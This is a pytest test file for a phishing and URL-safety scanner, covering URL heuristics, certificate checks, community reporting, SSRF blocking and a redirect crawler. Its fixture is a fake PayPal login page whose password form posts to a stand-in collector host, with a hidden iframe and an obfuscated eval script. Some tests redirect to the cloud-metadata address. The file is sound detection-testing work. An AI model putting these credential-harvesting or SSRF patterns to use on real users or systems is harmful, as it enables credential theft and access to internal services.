"""End-to-end tests against local servers (no internet needed)."""

import datetime as dt
import http.server
import ipaddress
import socket
import ssl
import sys
import threading
from pathlib import Path

import pytest
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from olfa_core import cert as certmod  # noqa: E402
from olfa_core import heuristics, webcheck  # noqa: E402
from olfa_core.fusion import fuse  # noqa: E402
from olfa_core.intel import Intel  # noqa: E402
from olfa_core.scanner import Scanner  # noqa: E402
from olfa_core.schema import level_from_score  # noqa: E402

PHISH_HTML = """<html><head><title>PayPal - Log in</title></head><body>
<form action="http://collector.invalid/steal" method="post"><input type="password" name="p"></form>
<iframe src="https://evil.invalid/x" style="display:none"></iframe>
<script>eval(atob("YWxlcnQoMSk="))</script>
<p>Your account will be suspended unless you verify immediately.</p></body></html>"""
CLEAN_HTML = "<html><head><title>Docs</title></head><body><p>hello</p></body></html>"


def make_cert(cn="localhost", days_valid=90, self_signed=True, not_before_days_ago=1):
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
    now = dt.datetime.now(dt.timezone.utc)
    nb = now - dt.timedelta(days=not_before_days_ago)
    cert = (x509.CertificateBuilder().subject_name(name).issuer_name(name).public_key(key.public_key())
            .serial_number(x509.random_serial_number()).not_valid_before(nb)
            .not_valid_after(nb + dt.timedelta(days=days_valid))
            .add_extension(x509.SubjectAlternativeName([x509.DNSName(cn)]), critical=False)
            .sign(key, hashes.SHA256()))
    return cert, key


def serve(body, headers=None, tls_cert=None, tmp_path=None):
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("content-type", "text/html")
            for k, v in (headers or {}).items():
                self.send_header(k, v)
            self.end_headers()
            self.wfile.write(body.encode())

        def log_message(self, *a):
            pass

    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
    if tls_cert:
        cert, key = tls_cert
        cf, kf = tmp_path / "c.pem", tmp_path / "k.pem"
        cf.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
        kf.write_bytes(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(cf, kf)
        srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, srv.server_address[1]


# ---------------------------------------------------------------- lexical
@pytest.mark.parametrize("url,code", [
    ("https://paypa1.com/login", "typosquat"),
    ("https://paypal-login-secure.com", "brand_impersonation"),
    ("https://paypal.com.account-verify.xyz/webscr", "brand_impersonation"),
    ("http://192.168.4.5/bank/login.html", "ip_address_host"),
    ("https://xn--pypal-4ve.com", "punycode_domain"),
    ("http://user@evil.tk/x", "suspicious_url_pattern"),
])
def test_lexical_flags(url, code):
    assert code in {r["code"] for r in heuristics.analyze(url)}


@pytest.mark.parametrize("url", ["https://antigravity.google/download", "https://mega.nz/", "https://line.me/", "https://amazonaws.com/", "https://googleapis.com/", "https://mail.ru/"])
def test_popular_domains_are_not_brand_impostors(url):
    assert not [r for r in heuristics.analyze(url) if r["severity"] == "high"], url


@pytest.mark.parametrize("url", ["https://www.paypal.com/signin", "https://github.com/anthropics", "https://www.sbi.co.in", "https://example.com/", "https://uidai.gov.in/en/", "https://mail.google.com"])
def test_lexical_no_false_positive_on_legit(url):
    assert not [r for r in heuristics.analyze(url) if r["severity"] == "high"], url


# ---------------------------------------------------------------- cert
def test_self_signed_cert_detected(tmp_path):
    srv, port = serve(CLEAN_HTML, tls_cert=make_cert(), tmp_path=tmp_path)
    out = certmod.check("localhost", port, allow_private=True)
    codes = {r["code"] for r in out["reasons"]}
    assert "self_signed_certificate" in codes
    assert out["cert"]["level"] == "red"
    assert out["cert"]["chain"] and out["cert"]["chain"][0]["subject"]["cn"] == "localhost"


def test_expired_and_mismatch_cert(tmp_path):
    cert, key = make_cert(cn="other.example", days_valid=10, not_before_days_ago=60)
    srv, port = serve(CLEAN_HTML, tls_cert=(cert, key), tmp_path=tmp_path)
    codes = {r["code"] for r in certmod.check("localhost", port, allow_private=True)["reasons"]}
    assert "cert_expired" in codes and "cert_hostname_mismatch" in codes


def test_private_target_refused():
    out = certmod.check("localhost", 443)  # allow_private False
    assert out["cert"]["level"] == "gray" and not out["reasons"]


# ---------------------------------------------------------------- web
def test_webcheck_finds_phishing_page(tmp_path):
    srv, port = serve(PHISH_HTML)
    w = webcheck.check(f"http://localhost:{port}/", allow_private=True)
    codes = {r["code"] for r in w["reasons"]}
    assert {"credential_form_cross_origin", "credentials_over_http", "hidden_iframe", "obfuscated_script", "urgency_language"} <= codes
    assert "brand_impersonation" in codes  # PayPal login on localhost


def test_webcheck_clean_page_has_no_findings_and_grades_headers():
    srv, port = serve(CLEAN_HTML, headers={"strict-transport-security": "max-age=1", "content-security-policy": "default-src 'self'",
                                           "x-content-type-options": "nosniff", "referrer-policy": "no-referrer", "x-frame-options": "DENY"})
    w = webcheck.check(f"http://localhost:{port}/", allow_private=True)
    assert not w["reasons"]
    assert w["web"]["fetched"]


def test_webcheck_refuses_private_by_default():
    srv, port = serve(CLEAN_HTML)
    w = webcheck.check(f"http://localhost:{port}/")
    assert w["web"]["fetched"] is False and "private_address" in (w["page"]["error"] or "")


# ---------------------------------------------------------------- intel
def test_intel_needs_independent_reporters(tmp_path):
    db = Intel(":memory:")
    s = db.report("http://evil-shop.tk/a", "phishing", "reporter-token-1")
    assert s["status"] == "reported"  # one voice never confirms
    s = db.report("http://evil-shop.tk/b", "phishing", "reporter-token-1")  # same reporter, replaces vote
    assert s["threat_reports"] == 1 and s["status"] == "reported"
    db.report("http://evil-shop.tk/", "phishing", "reporter-token-2")
    s = db.report("http://evil-shop.tk/", "scam", "reporter-token-3")
    assert s["status"] == "confirmed_malicious"
    assert db.feed()[0]["domain"] == "evil-shop.tk"
    latest = db.recent(5)
    assert latest[0]["domain"] == "evil-shop.tk"
    assert "reporter" not in latest[0] and set(latest[0]) >= {"domain", "verdict", "note", "url", "created"}


def test_intel_brigading_by_safe_votes_is_not_instant(tmp_path):
    db = Intel(":memory:")
    for i in range(3):
        db.report("http://bad.tk", "phishing", f"honest-token-{i}")
    s = db.report("http://bad.tk", "safe", "attacker-token-1")
    assert s["status"] == "confirmed_malicious"  # one dissent does not flip it


def test_intel_validation():
    db = Intel(":memory:")
    with pytest.raises(ValueError):
        db.report("http://x.tk", "nonsense", "tokentoken")
    with pytest.raises(ValueError):
        db.report("http://x.tk", "phishing", "short")


def test_intel_rate_limit():
    db = Intel(":memory:")
    with pytest.raises(PermissionError):
        for i in range(40):
            db.report(f"http://site{i}.tk", "phishing", "spammer-token-1")


# ---------------------------------------------------------------- fusion
def test_ml_alone_never_makes_a_site_dangerous():
    res = fuse("https://github.com/", threat=[], web=[], cert=[], intel=[], ml={"risk": 0.999, "p_legit": 0.001, "p_legit_xgb": 0, "p_legit_charlr": 0},
               intel_status="unknown", status={})
    assert res["level"] == "safe" and res["score"] == 0


def test_confirmed_safe_does_not_hide_high_severity():
    high = [{"code": "credential_form_cross_origin", "message": "x", "severity": "high"}]
    res = fuse("u", threat=[], web=high, cert=[], intel=[], ml=None, intel_status="confirmed_safe", status={})
    assert res["score"] > 0.4


def test_unavailable_pillar_is_reported():
    res = fuse("u", threat=[], web=[], cert=[], intel=[], ml=None, intel_status="unknown", status={"web": "unavailable"})
    assert res["coverage"]["complete"] is False


# ---------------------------------------------------------------- full scan
def test_full_scan_of_local_phishing_page():
    srv, port = serve(PHISH_HTML)
    sc = Scanner(intel=Intel(":memory:"), allow_private=True)
    res = sc.scan(f"http://localhost:{port}/login")
    assert res["level"] == "dangerous", res["reasons"]
    assert set(res["pillars"]) == {"threat", "web", "certificate", "intel"}
    assert res["pillars"]["web"]["score"] > 0.5


def test_community_confirmation_flips_quick_scan():
    sc = Scanner(intel=Intel(":memory:"))
    before = sc.scan("http://totally-new-site.tk/", deep=False)
    for i in range(3):
        sc.intel.report("http://totally-new-site.tk/", "phishing", f"token-number-{i}")
    sc._cache.clear()
    after = sc.scan("http://totally-new-site.tk/", deep=False)
    assert after["score"] >= 0.9 and after["score"] > before["score"]
    assert "community_confirmed" in {r["code"] for r in after["reasons"]}


def test_ssrf_scan_of_loopback_is_refused():
    sc = Scanner(intel=Intel(":memory:"))
    res = sc.scan("http://127.0.0.1:9/")
    assert res["pillars"]["web"]["status"] == "unavailable"
    assert res["redirects"][0]["kind"] == "blocked"


def test_bad_input_rejected():
    sc = Scanner(intel=Intel(":memory:"))
    for bad in ["", "javascript:alert(1)", "ftp://x.com", "http://a b.com"]:
        with pytest.raises(ValueError):
            sc.scan(bad)


# ------------------------------------------------ local-network (VPN / filtered DNS) handling
def test_origin_resolving_privately_is_a_note_not_a_penalty():
    sc = Scanner(intel=Intel(":memory:"))  # allow_private False, like production
    res = sc.scan("https://localhost:9/")   # stands in for 'github.com resolves to 127.x on this network'
    assert "blocked_private_address" not in {r["code"] for r in res["reasons"]}
    assert res["notes"] and "private" in res["notes"][0]
    assert res["level"] == "safe"
    assert res["coverage"]["complete"] is False  # still honest that web/cert were not checked


def test_opt_in_cidr_lets_fake_ip_networks_through(monkeypatch):
    srv, port = serve(CLEAN_HTML)
    sc = Scanner(intel=Intel(":memory:"))
    blocked = sc.scan(f"http://127.0.0.1:{port}/")
    assert blocked["web_assessment"]["fetched"] is False
    monkeypatch.setenv("OLFA_ALLOW_CIDRS", "127.0.0.0/8,::1/128")
    sc2 = Scanner(intel=Intel(":memory:"))
    ok = sc2.scan(f"http://127.0.0.1:{port}/")
    assert ok["web_assessment"]["fetched"] is True and not ok["notes"]


# ------------------------------------------------ DNS fallback, crawler, components
from olfa_core import netguard  # noqa: E402
from olfa_core.crawl import crawl  # noqa: E402


def _fake_dns(monkeypatch, system_ips):
    monkeypatch.setattr(netguard.socket, "getaddrinfo", lambda host, port, type=0: [(2, 1, 6, "", (ip, port)) for ip in system_ips])
    netguard._doh_cache.clear()


def test_private_system_dns_falls_back_to_doh(monkeypatch):
    _fake_dns(monkeypatch, ["198.18.0.23"])
    monkeypatch.setattr(netguard, "_doh_lookup", lambda h: ["140.82.112.3"])
    assert netguard.resolve_info("github.com", 443) == (["140.82.112.3"], "doh")


def test_doh_cannot_launder_a_genuinely_internal_name(monkeypatch):
    _fake_dns(monkeypatch, ["10.0.0.5"])
    monkeypatch.setattr(netguard, "_doh_lookup", lambda h: ["10.0.0.5"])
    with pytest.raises(netguard.Blocked):
        netguard.resolve_info("intranet.example", 443)
    monkeypatch.setattr(netguard, "_doh_lookup", lambda h: ["140.82.112.3", "10.0.0.5"])  # one private answer poisons the set
    with pytest.raises(netguard.Blocked):
        netguard.resolve_info("intranet.example", 443)
    monkeypatch.setattr(netguard, "_doh_lookup", lambda h: [])
    with pytest.raises(netguard.Blocked):
        netguard.resolve_info("intranet.example", 443)


def test_ip_literals_never_use_doh(monkeypatch):
    _fake_dns(monkeypatch, ["169.254.169.254"])
    called = []
    monkeypatch.setattr(netguard, "_doh_lookup", lambda h: called.append(h) or ["8.8.8.8"])
    with pytest.raises(netguard.Blocked):
        netguard.resolve_info("169.254.169.254", 80)
    assert not called


def test_public_system_dns_is_used_directly(monkeypatch):
    _fake_dns(monkeypatch, ["140.82.112.3"])
    monkeypatch.setattr(netguard, "_doh_lookup", lambda h: (_ for _ in ()).throw(AssertionError("must not be called")))
    assert netguard.resolve_info("github.com", 443) == (["140.82.112.3"], "system")


def serve_routes(routes):
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            status, headers, body = routes.get(self.path, (404, {}, "nope"))
            self.send_response(status)
            for k, v in headers.items():
                self.send_header(k, v)
            self.end_headers()
            self.wfile.write(body.encode())

        def log_message(self, *a):
            pass

    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv.server_address[1]


def test_crawler_follows_http_and_meta_redirects_and_keeps_final_page():
    port = serve_routes({
        "/a": (302, {"location": "/b"}, ""),
        "/b": (200, {}, '<meta http-equiv="refresh" content="0;url=/c">'),
        "/c": (200, {"x-test": "1"}, CLEAN_HTML),
    })
    out = crawl(f"http://127.0.0.1:{port}/a", allow_private=True)
    assert out["final_url"].endswith("/c") and len(out["hops"]) == 3
    assert [h["kind"] for h in out["hops"]] == ["http", "meta_refresh", "http"]
    assert out["final_page"]["headers"]["x-test"] == "1"


def test_crawler_detects_loops_and_blocks_private_hops():
    port = serve_routes({"/x": (302, {"location": "/y"}, ""), "/y": (302, {"location": "/x"}, "")})
    assert "redirect_loop" in crawl(f"http://127.0.0.1:{port}/x", allow_private=True)["flags"]
    port2 = serve_routes({"/go": (302, {"location": "http://127.0.0.1:9/admin"}, "")})
    out = crawl(f"http://localhost:{port2}/go", allow_private=False)
    assert out["hops"][0]["kind"] == "blocked"


def test_midchain_redirect_to_private_address_is_still_flagged(monkeypatch):
    """A public first hop that redirects to the cloud-metadata address must be blocked and flagged."""
    from olfa_core import crawl as crawl_mod
    real = crawl_mod.webcheck.fetch
    calls = []

    def fake_fetch(url, allow_private=False):
        calls.append(url)
        if len(calls) == 1:  # pretend hop 1 is a public site answering with a redirect
            return {"url": url, "status": 302, "headers": {"location": "http://169.254.169.254/latest/meta-data"},
                    "cookies": [], "body": "", "error": None, "resolved_via": "system"}
        return real(url, allow_private=allow_private)

    monkeypatch.setattr(crawl_mod.webcheck, "fetch", fake_fetch)
    out = crawl("http://public-looking.example/", allow_private=False)
    assert out["hops"][1]["kind"] == "blocked" and "blocked_private_address" in out["flags"]
    assert len(calls) == 2  # the metadata address was never fetched by the fake, and the real guard refused it


def test_components_summarise_all_four_checks():
    port = serve(PHISH_HTML)[1]
    res = Scanner(intel=Intel(":memory:"), allow_private=True).scan(f"http://localhost:{port}/login")
    c = res["components"]
    assert set(c) == {"ml", "page_security", "certificate", "community", "overall"}
    assert c["page_security"]["grade"] in "ABCDF" and c["page_security"]["score"] is not None
    assert c["overall"]["level"] == res["level"] and len(c["overall"]["rules"]) == 4
    assert c["community"]["status"] == "unknown"
